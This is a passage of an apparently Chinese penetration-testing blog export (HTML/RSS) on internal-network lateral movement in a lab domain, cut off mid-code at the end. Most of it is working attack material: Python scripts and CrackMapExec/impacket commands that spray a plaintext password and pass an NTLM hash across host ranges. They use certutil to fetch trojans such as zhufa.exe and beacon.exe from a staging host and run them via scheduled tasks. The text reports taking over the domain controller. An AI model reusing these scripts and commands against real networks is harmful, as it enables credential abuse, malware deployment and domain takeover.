class="keyword">import</span> os</span><br><span class="line">ips=[<span class="string">&#x27;192.168.3.21&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">down</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        wmi_exec=<span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\wmiexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@%s &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/testm.exe&quot;&#x27;</span>%ip</span><br><span class="line">        <span class="built_in">print</span>(wmi_exec)</span><br><span class="line">        os.system(wmi_exec)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zx</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        wmi_exec=<span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\wmiexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@%s &quot;c:/testm.exe&quot;&#x27;</span>%ip</span><br><span class="line">        <span class="built_in">print</span>(wmi_exec)</span><br><span class="line">        os.system(wmi_exec)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    down()</span><br><span class="line">    zx()</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929110701383.png" alt="image-20220929110701383"><br>域控也成功上线–抓取域控密码直接通杀</p><h4 id="2、Linux-Proxychains-CrackMapExec"><a href="#2、Linux-Proxychains-CrackMapExec" class="headerlink" title="2、Linux+Proxychains+CrackMapExec"></a>2、Linux+Proxychains+CrackMapExec</h4><p>恢复到初始状态<br><img src="/posts/82f7f61b/image-20220929110947945.png" alt="image-20220929110947945"></p><p>上述的脚本要不断去修改才能达到理想效果，利用下面的项目更加方便快捷<br><strong>CrackMapExec</strong><br>Github：<a href="https://github.com/Porchetta-Industries/CrackMapExec">https://github.com/Porchetta-Industries/CrackMapExec</a><br>官方手册：<a href="https://mpgn.gitbook.io/crackmapexec/">https://mpgn.gitbook.io/crackmapexec/</a><br>部分案例：<a href="https://www.freebuf.com/sectool/184573.html">https://www.freebuf.com/sectool/184573.html</a><br>按照官方手册提示进行安装</p><p><strong>Linux Proxychains使用</strong><br>安装使用：<a href="https://blog.csdn.net/qq_53086690/article/details/121779832">https://blog.csdn.net/qq_53086690/article/details/121779832</a><br>代理配置：Proxychains.conf<br>代理调用：Proxychains 命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install Proxychains4 #安装</span><br><span class="line">vim /etc/proxychains4.conf #编辑配置文件</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929191046187.png" alt="image-20220929191046187"></p><p>密码喷射域登录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27;</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929191740434.png" alt="image-20220929191740434"></p><p>密码喷射本地登录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27; --local-auth</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929191837593.png" alt="image-20220929191837593"></p><p>密码喷射本地登录命令执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27; -x &#x27;whoami&#x27; --local-aut</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929192122760.png" alt="image-20220929192122760"><br>密码喷射本地登录命令执行上线：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27; -x &#x27;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/test.exe &amp; c:/test.exe&#x27; --local-auth</span><br></pre></td></tr></table></figure><p><img src="/posts/82f7f61b/image-20220929192238867.png" alt="image-20220929192238867"><br>成功上线两台主机</p><p>密码喷射域登录命令执行上线：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 cme smb 192.168.3.21-32 -u administrator -p &#x27;admin!@#45&#x27; -x &#x27;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/test.exe &amp; c:/test.exe&#x27;</span><br></pre></td></tr></table></figure><p>密码喷射本地&amp;域登录命令执行全自动上线：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 cme smb 192.168.3.21-32 -u user.txt -p pass.txt -x &#x27;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/test.exe &amp; c:/test.exe&#x27;</span><br><span class="line"></span><br><span class="line">proxychains4 cme smb 192.168.3.21-32 -u Administrator -p Admin12345 -x &#x27;cmd.exe /c certutil -urlcache -split -f http://192.168.3.31/zf.exe c:/test.exe &amp; c:/test.exe&#x27; --local-auth</span><br></pre></td></tr></table></figure><p>根据上线主机抓取密码然后写入字典进行测试<br><img src="/posts/82f7f61b/image-20220929212413728.png" alt="image-20220929212413728"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网横向移动(一)IPC</title>
      <link href="/posts/2dc66d79/"/>
      <url>/posts/2dc66d79/</url>
      
        <content type="html"><![CDATA[<h1 id="内网横向移动-一-IPCIPC"><a href="#内网横向移动-一-IPCIPC" class="headerlink" title="内网横向移动(一)IPCIPC"></a>内网横向移动(一)IPCIPC</h1><h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><p><img src="/posts/2dc66d79/bfl2kYExirJ2o8jENtd6_g.png" alt="img"><br><img src="/posts/2dc66d79/image-20220927161548820.png" alt="image-20220927161548820"><br>只有webserver出网，我们已经拿到webserver的shell，尝试对其他内网主机进行横向移动</p><h2 id="域信息收集"><a href="#域信息收集" class="headerlink" title="域信息收集"></a>域信息收集</h2><p>需要收集:目标 用户 凭据 网络<br>查看该主机是否为域环境 (cs命令行下需要在前面加shell)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time /domain</span><br></pre></td></tr></table></figure><p><img src="/posts/2dc66d79/image-20220927161913233.png" alt="image-20220927161913233"></p><p>获取域控ip地址</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping OWA2010CN-God.god.org</span><br></pre></td></tr></table></figure><p><img src="/posts/2dc66d79/image-20220927162118801.png" alt="image-20220927162118801"></p><p>可以看到192.168.3.21可能为域控<br>获取域内用户名</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user /domain</span><br></pre></td></tr></table></figure><p><img src="/posts/2dc66d79/image-20220927162536034.png" alt="image-20220927162536034"></p><p>接下来用插件提权<br><img src="/posts/2dc66d79/image-20220927162851592.png" alt="image-20220927162851592"><br><img src="/posts/2dc66d79/image-20220927162903508.png" alt="image-20220927162903508"><br><img src="/posts/2dc66d79/image-20220927162939083.png" alt="image-20220927162939083"></p><p>接下来用插件进行端口扫描发现主机<br><img src="/posts/2dc66d79/image-20220927162719180.png" alt="image-20220927162719180"><br><img src="/posts/2dc66d79/image-20220927163242046.png" alt="image-20220927163242046"><br><img src="/posts/2dc66d79/image-20220927163735058.png" alt="image-20220927163735058"><br>获取明文密码<br><img src="/posts/2dc66d79/image-20220927164105343.png" alt="image-20220927164105343"><br>抓取hash<br><img src="/posts/2dc66d79/image-20220927164322560.png" alt="image-20220927164322560"><br><img src="/posts/2dc66d79/image-20220927164448467.png" alt="image-20220927164448467"></p><h2 id="域横向移动-IPC"><a href="#域横向移动-IPC" class="headerlink" title="域横向移动-IPC"></a>域横向移动-IPC</h2><h3 id="什么是ipc"><a href="#什么是ipc" class="headerlink" title="什么是ipc?"></a>什么是ipc?</h3><p>IPC是专用管道，可以实现对远程计算机的访问，<br>需要使用目标系统用户的账号密码，使用139、445端口。</p><p>利用步骤:</p><ol><li>建立IPC链接到目标主机</li><li>拷贝要执行的命令脚本到目标主机</li><li>查看目标时间，创建计划任务（at、schtasks）定时执行拷贝到的脚本</li><li>删除IPC链接</li></ol><p>命令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">net use \\server\ipc$ &quot;password&quot; /user:username # 工作组</span><br><span class="line">net use \\server\ipc$ &quot;password&quot; /user:domain\username #域内</span><br><span class="line">dir \\xx.xx.xx.xx\C$\        # 查看文件列表</span><br><span class="line">copy \\xx.xx.xx.xx\C$\1.bat 1.bat # 下载文件</span><br><span class="line">copy 1.bat \\xx.xx.xx.xx\C$ # 复制文件</span><br><span class="line">net use \\xx.xx.xx.xx\C$\1.bat /del # 删除IPC</span><br><span class="line">net view xx.xx.xx.xx        # 查看对方共享</span><br></pre></td></tr></table></figure><p>建立IPC常见的错误代码<br>（1）5：拒绝访问，可能是使用的用户不是管理员权限，需要先提升权限<br>（2）51：网络问题，Windows 无法找到网络路径<br>（3）53：找不到网络路径，可能是IP地址错误、目标未开机、目标Lanmanserver服务未启动、有防火墙等问题<br>（4）67：找不到网络名，本地Lanmanworkstation服务未启动，目标删除ipc$<br>（5）1219：提供的凭据和已存在的凭据集冲突，说明已建立IPC$，需要先删除<br>（6）1326：账号密码错误<br>（7）1792：目标NetLogon服务未启动，连接域控常常会出现此情况<br>（8）2242：用户密码过期，目标有账号策略，强制定期更改密码</p><p>建立IPC失败的可能原因<br>（1）目标系统不是NT或以上的操作系统<br>（2）对方没有打开IPC$共享<br>（3）对方未开启139、445端口，或者被防火墙屏蔽<br>（4）输出命令、账号密码有错误</p><h3 id="命令版-at-amp-schtasks"><a href="#命令版-at-amp-schtasks" class="headerlink" title="命令版-at&amp;schtasks"></a>命令版-at&amp;schtasks</h3><p>0、上线配置</p><p>上线其他主机有两种方式:<br>正向：建立正向木马由webserver这台主机去连接达到上线<br><img src="/posts/2dc66d79/image-20220927165732535.png" alt="image-20220927165732535"></p><p>反向：在webserver建立监听器其他主机反向连接到webserver达到转发上线<br>代理转发-&gt;转发上线-&gt;beacon.exe<br><img src="/posts/2dc66d79/image-20220927181726329.png" alt="image-20220927181726329"><br><img src="/posts/2dc66d79/image-20220927183757084.png" alt="image-20220927183757084"></p><p>在实战中如何将木马上传并且执行呢(以反向连接为例)<br>先将我们生成的木马上传到webserver主机<br><img src="/posts/2dc66d79/image-20220927183945820.png" alt="image-20220927183945820"><br><img src="/posts/2dc66d79/image-20220927184013184.png" alt="image-20220927184013184"></p><p>接下来就要用到IPC了</p><p>1、at</p><p>适用版本 &lt; Windows2012</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.21\ipc$ &quot;Admin12345&quot; /user:god.org\administrator #建立ipc连接：</span><br><span class="line">copy beacon.exe \\192.168.3.21\c$ #拷贝执行文件到目标机器</span><br><span class="line">at \\192.168.3.21 18:45 c:\beacon.exe  #添加计划任务</span><br></pre></td></tr></table></figure><p>2、schtasks<br>适用版本 &gt;&#x3D;Windows2012</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.3.32\ipc$ &quot;Admin12345&quot; /user:god.org\administrator # 建立ipc连接：</span><br><span class="line">copy zhufa.exe \\192.168.3.32\c$ #复制文件到其C盘</span><br><span class="line">schtasks /create /s 192.168.3.32 /ru &quot;SYSTEM&quot; /tn beacon /sc DAILY /tr c:\beacon.exe /F #创beacon任务对应执行文件</span><br><span class="line">schtasks /run /s 192.168.3.32 /tn beacon /i #运行beacon任务</span><br><span class="line">schtasks /delete /s 192.168.3.32 /tn beacon /f #删除beacon任务</span><br></pre></td></tr></table></figure><h3 id="插件版-CS-amp-LSTARS"><a href="#插件版-CS-amp-LSTARS" class="headerlink" title="插件版-CS&amp;LSTARS"></a>插件版-CS&amp;LSTARS</h3><p>LSTARS-横向移动-IPC连接<br><img src="/posts/2dc66d79/image-20220927191420684.png" alt="image-20220927191420684"><br><img src="/posts/2dc66d79/image-20220927191642464.png" alt="image-20220927191642464"><br><img src="/posts/2dc66d79/image-20220927191652170.png" alt="image-20220927191652170"></p><h3 id="套件版-Impacket-atexec"><a href="#套件版-Impacket-atexec" class="headerlink" title="套件版-Impacket-atexec"></a>套件版-Impacket-atexec</h3><p>impacket-atexec<br>该工具是一个半交互的工具，适用于Webshell下，Socks代理下;<br>在渗透利用中可以收集用户名、明文密码、密码hash、远程主机等做成字典，批量测试</p><p>1、Py版：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a><br>利用ipc执行命令并回显</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python atexec.py god/administrator:Admin12345@192.168.3.21 &quot;ver&quot;</span><br><span class="line">python atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</span><br></pre></td></tr></table></figure><p>将木马放到webserver的web站点然后利用命令让其他主机下载木马并执行<br><img src="/posts/2dc66d79/image-20220927213624492.png" alt="image-20220927213624492"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python atexec.py god/administrator:Admin12345@192.168.3.21 &quot;certutil.exe -urlcache -split -f http://192.168.3.31:80/zhufa.exe test.exe&quot;</span><br></pre></td></tr></table></figure><p>2、Exe版：<a href="https://gitee.com/RichChigga/impacket-examples-windows">https://gitee.com/RichChigga/impacket-examples-windows</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">CS本地用户明文连接：</span></span><br><span class="line">shell atexec.exe ./administrator:Admin12345@192.168.3.21 &quot;whoami&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">CS域内用户明文连接：</span></span><br><span class="line">shell atexec.exe god/administrator:Admin12345@192.168.3.21 &quot;ver&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">CS域内本地用户明文密文连接：</span></span><br><span class="line">shell atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@192.168.3.21 &quot;whoami&quot;</span><br><span class="line">shell atexec.exe -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@192.168.3.21 &quot;whoami&quot;</span><br></pre></td></tr></table></figure><h3 id="代理版-Socks-amp-Py-amp-atexec"><a href="#代理版-Socks-amp-Py-amp-atexec" class="headerlink" title="代理版-Socks&amp;Py&amp;atexec"></a>代理版-Socks&amp;Py&amp;atexec</h3><p>攻击全由本机发出通过socks代理向内网通讯</p><p>1、建立SOCK节点并连接<br><img src="/posts/2dc66d79/image-20220927195928499.png" alt="image-20220927195928499"><br>用Proxifier配置代理<br><img src="/posts/2dc66d79/image-20220927200528255.png" alt="image-20220927200528255"><br><img src="/posts/2dc66d79/image-20220927200548849.png" alt="image-20220927200548849"><br><img src="/posts/2dc66d79/image-20220927200907617.png" alt="image-20220927200907617"></p><p>2、自写脚本批量下载上线</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,time</span><br><span class="line">ips=&#123;</span><br><span class="line">    <span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.29&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.32&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users=&#123;</span><br><span class="line">    <span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;boss&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dbadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;fileadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;itadmin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;mary&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;vpnadm&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;webadmin&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">passs=&#123;</span><br><span class="line">    <span class="string">&#x27;admin!@#45&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#下载后门</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xz</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">for</span> mima <span class="keyword">in</span> passs:</span><br><span class="line">                exec1=<span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py ./administrator:&#x27;</span>+mima+<span class="string">&#x27;@&#x27;</span>+ip+<span class="string">&#x27; &quot;certutil -urlcache -split -f http://192.168.3.31/zhufa.exe c:/test.exe&quot;&#x27;</span></span><br><span class="line">                exec2=<span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py god/&#x27;</span>+user+<span class="string">&#x27;:&#x27;</span>+mima+<span class="string">&#x27;@&#x27;</span>+ip+<span class="string">&#x27; &quot;certutil -urlcache -split -f http://192.168.3.31/zhufa.exe c:/test.exe&quot;&#x27;</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span>+exec1+<span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + exec2 + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">                os.system(exec1)</span><br><span class="line">                os.system(exec2)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    xz()</span><br></pre></td></tr></table></figure><p>192.168.3.32，192.168.3.29下载成功<br><img src="/posts/2dc66d79/image-20220928110301622.png" alt="image-20220928110301622"><br><img src="/posts/2dc66d79/image-20220928110338368.png" alt="image-20220928110338368"></p><p>执行木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">ips = [<span class="string">&#x27;192.168.3.29&#x27;</span>, <span class="string">&#x27;192.168.3.32&#x27;</span>]</span><br><span class="line">passs = [<span class="string">&#x27;admin!@#45&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zx</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        <span class="keyword">for</span> pwd <span class="keyword">in</span> passs:</span><br><span class="line">            cmd = <span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py god/administrator:&#x27;</span> + pwd + <span class="string">&#x27;@&#x27;</span> + ip + <span class="string">&#x27; &quot;zx.exe&quot;&#x27;</span></span><br><span class="line">            cmd1 = <span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py ./administrator:&#x27;</span> + pwd + <span class="string">&#x27;@&#x27;</span> + ip + <span class="string">&#x27; &quot;zx.exe&quot;&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(cmd)</span><br><span class="line">            os.system(cmd)</span><br><span class="line">            os.system(cmd1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    zx()</span><br></pre></td></tr></table></figure><p><img src="/posts/2dc66d79/image-20220928112057717.png" alt="image-20220928112057717"><br>成功上线两台主机</p><p>3、继续收集凭据横向移动<br>利用刚刚上线的主机获取密码和hash继续横向移动，改下脚本<br><img src="/posts/2dc66d79/image-20220928120147723.png" alt="image-20220928120147723"></p><p>下载木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,time</span><br><span class="line">ips=&#123;</span><br><span class="line">    <span class="string">&#x27;192.168.3.21&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.25&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;192.168.3.30&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line">users=&#123;</span><br><span class="line">    <span class="string">&#x27;Administrator&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#下载后门</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xz</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        <span class="keyword">for</span> user <span class="keyword">in</span> users:</span><br><span class="line">            <span class="keyword">for</span> mima <span class="keyword">in</span> passs:</span><br><span class="line">                exec1=<span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 ./administrator@&#x27;</span>+ip+<span class="string">&#x27;&quot;certutil -urlcache -split -f http://192.168.3.31/zhufa.exe test.exe&quot;&#x27;</span></span><br><span class="line">                exec2=<span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@&#x27;</span>+ip+<span class="string">&#x27; &quot;certutil -urlcache -split -f http://192.168.3.31/zhufa.exe test.exe&quot;&#x27;</span></span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span>+exec1+<span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;---&gt;&#x27;</span> + exec2 + <span class="string">&#x27;&lt;---&#x27;</span>)</span><br><span class="line">                os.system(exec1)</span><br><span class="line">                os.system(exec2)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    xz()</span><br></pre></td></tr></table></figure><p><img src="/posts/2dc66d79/image-20220928121619404.png" alt="image-20220928121619404"></p><p><img src="/posts/2dc66d79/image-20220928121644442.png" alt="image-20220928121644442"></p><p>执行木马</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">ips = [<span class="string">&#x27;192.168.3.21&#x27;</span>, <span class="string">&#x27;192.168.3.25&#x27;</span>, <span class="string">&#x27;192.168.3.30&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">zx</span>():</span><br><span class="line">    <span class="keyword">for</span> ip <span class="keyword">in</span> ips:</span><br><span class="line">        cmd = <span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@&#x27;</span> + ip + <span class="string">&#x27; &quot;test.exe&quot;&#x27;</span></span><br><span class="line">        cmd1 = <span class="string">&#x27;D:\\python39\\python.exe D:\\ASecurityTools\\impacket-master\\examples\\atexec.py -hashes :ccef208c6485269c20db2cad21734fe7 god/administrator@&#x27;</span> + ip + <span class="string">&#x27; &quot;test.exe&quot;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(cmd)</span><br><span class="line">        os.system(cmd)</span><br><span class="line">        os.system(cmd1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    zx()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/posts/2dc66d79/image-20220928122959205.png" alt="image-20220928122959205"><br>再次抓明文密码<br><img src="/posts/2dc66d79/image-20220928123258847.png" alt="image-20220928123258847"><br>成功拿到域控密码</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网穿透上线</title>
      <link href="/posts/84ae0305/"/>
      <url>/posts/84ae0305/</url>
      
        <content type="html"><![CDATA[<h1 id="内网穿透上线"><a href="#内网穿透上线" class="headerlink" title="内网穿透上线"></a>内网穿透上线</h1><p>一个内网中的主机想要控制另一个内网中的主机因为无法直接通讯,所以要用到内网穿透<br><img src="/posts/84ae0305/image-20220924084714528.png" alt="image-20220924084714528"><br>内网穿透简单理解也就是创建一个外网服务器,将我们的端口映射到外网服务器中，当肉鸡流量达到外网服务器后外网服务器把流量转给我们的攻击机</p><p>旨在代理连接肉鸡后实现本地渗透肉鸡网络架构</p><p>Linux：Proxychains<br>Windows：Sockscap Proxifier<br>穿透项目：Ngrok Frp Spp Nps EW(停更)<br>优点：穿透加密数据，中间平台，防追踪，解决网络问题</p><h2 id="Ngrok"><a href="#Ngrok" class="headerlink" title="Ngrok"></a>Ngrok</h2><p><a href="https://www.ngrok.cc/">https://www.ngrok.cc/</a><br>支持的协议：tcp、http、https<br>支持的类型：正向代理、反向代理<br><img src="/posts/84ae0305/image-20220924090917778.png" alt="image-20220924090917778"><br>使用免费的服务器就行</p><p>1、服务端配置：</p><p>开通隧道-TCP协议-指向IP和端口-开通隧道-连接隧道<br><img src="/posts/84ae0305/image-20220924091746949.png" alt="image-20220924091746949"><br>红框位置处为攻击机地址<br><img src="/posts/84ae0305/image-20220924092130441.png" alt="image-20220924092130441"></p><p>2、客户端连接服务端：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./sunny clientid [隧道id] #控制端连接Ngrok的服务器</span><br></pre></td></tr></table></figure><p><img src="/posts/84ae0305/image-20220924092408911.png" alt="image-20220924092408911"><br><img src="/posts/84ae0305/image-20220924092440755.png" alt="image-20220924092440755"><br>成功连接</p><p>3、客户端生成后门配置监听：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td 